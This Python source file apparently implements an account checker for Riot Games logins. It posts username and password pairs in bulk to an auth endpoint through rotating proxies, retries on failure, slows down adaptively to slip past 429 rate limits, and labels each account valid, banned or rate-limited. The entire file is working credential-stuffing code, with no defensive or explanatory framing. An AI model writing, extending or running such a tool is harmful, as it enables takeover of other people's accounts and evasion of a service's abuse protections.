import httpx
import asyncio
import numpy as np
from tenacity import retry, stop_after_attempt, wait_random_exponential
from typing import Dict, Any

class APIClient:
    def __init__(self, proxy_engine):
        self.proxy_engine = proxy_engine
        self.session = httpx.AsyncClient(
            limits=httpx.Limits(max_connections=1000),
            proxies=self.proxy_engine.next(),
            timeout=20
        )
        self.rate_metrics = {
            "base_delay": 1.5,
            "last_reset": 0
        }
        self.status_map = {
            200: "valid",
            403: "banned",
            429: "rate_limited"
        }

    async def __aenter__(self):
        return self

    async def __aexit__(self, *_):
        await self.session.aclose()

    @retry(
        stop=stop_after_attempt(7),
        wait=wait_random_exponential(multiplier=1, max=40)
    )
    async def verify_account(self, acc: Dict[str, str]) -> Dict[str, Any]:
        await self._adaptive_delay()
        try:
            resp = await self.session.post(
                f"https://{acc['region']}.api.riotgames.com/auth",
                json={"username": acc["user"], "password": acc["pass"]},
                headers={"X-Custom-UA": "ValSupreme/5.0"}
            )
            return self._process_response(resp, acc)
        except (httpx.ProxyError, httpx.RemoteProtocolError, httpx.ConnectTimeout):
            self.proxy_engine.cycle()
            raise

    def _process_response(self, resp: httpx.Response, acc: Dict[str, str]) -> Dict[str, Any]:
        status_code = resp.status_code
        current_time = asyncio.get_event_loop().time()
        
        if status_code == 429:
            penalty_window = max(15, int(resp.headers.get("Retry-After", 15)))
            self.rate_metrics["base_delay"] = np.clip(penalty_window * 1.3, 5, 120)
            self.rate_metrics["last_reset"] = current_time
            
        return {
            "user": acc["user"],
            "region": acc["region"],
            "status": self.status_map.get(status_code, "error"),
            "proxy": self.proxy_engine.current,
            "latency": current_time - self.rate_metrics["last_reset"],
            "timestamp": current_time
        }

    async def _adaptive_delay(self) -> None:
        if not self.rate_metrics["last_reset"]:
            return
            
        elapsed = asyncio.get_event_loop().time() - self.rate_metrics["last_reset"]
        jitter = np.random.uniform(0.8, 1.2)
        delay = max(0, (self.rate_metrics["base_delay"] * jitter) - elapsed)
        
        if delay > 0:
            await asyncio.sleep(delay)
